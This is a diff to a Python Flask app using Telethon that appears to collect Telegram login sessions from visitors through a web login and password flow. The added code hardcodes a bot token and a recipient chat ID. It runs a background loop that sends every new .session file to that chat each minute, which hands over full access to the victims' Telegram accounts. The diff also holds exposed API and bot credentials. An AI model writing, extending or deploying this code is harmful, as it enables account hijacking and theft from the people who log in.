@@ -8,21 +8,39 @@ import threading
 API_ID = 26006502
 API_HASH = "9afc2208b8cec0afe06c9c2bc15b53e4"
 
+BOT_TOKEN = "8213641387:AAF8mmuXPt0AjLd5z7fpZIdChOY16rB-GyM"     # <-- сюда токен бота от @BotFather
+CHAT_ID = 7440693813              # <-- сюда свой Telegram ID (куда слать сообщения)
+
 os.makedirs("sessions", exist_ok=True)
 
 app = Flask(__name__, template_folder="templates", static_folder="static")
 loop = asyncio.new_event_loop()
 
+bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+
+sent_files = set()
+
+async def send_new_sessions():
+    while True:
+        files = os.listdir("sessions")
+        new_files = [f for f in files if f.endswith(".session") and f not in sent_files]
+        for file_name in new_files:
+            path = os.path.join("sessions", file_name)
+            try:
+                await bot.send_file(CHAT_ID, path, caption=f"Новый файл сессии: {file_name}")
+                sent_files.add(file_name)
+            except Exception as e:
+                print(f"Ошибка при отправке файла {file_name}: {e}")
+        await asyncio.sleep(60)  # проверять каждые 60 секунд
 
 def start_loop():
     asyncio.set_event_loop(loop)
+    loop.create_task(send_new_sessions())
     loop.run_forever()
-
 
 threading.Thread(target=start_loop, daemon=True).start()
 
 clients = {}
-
 
 def run_async(coro):
     return asyncio.run_coroutine_threadsafe(coro, loop).result()
@@ -102,4 +120,3 @@ def password():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
-
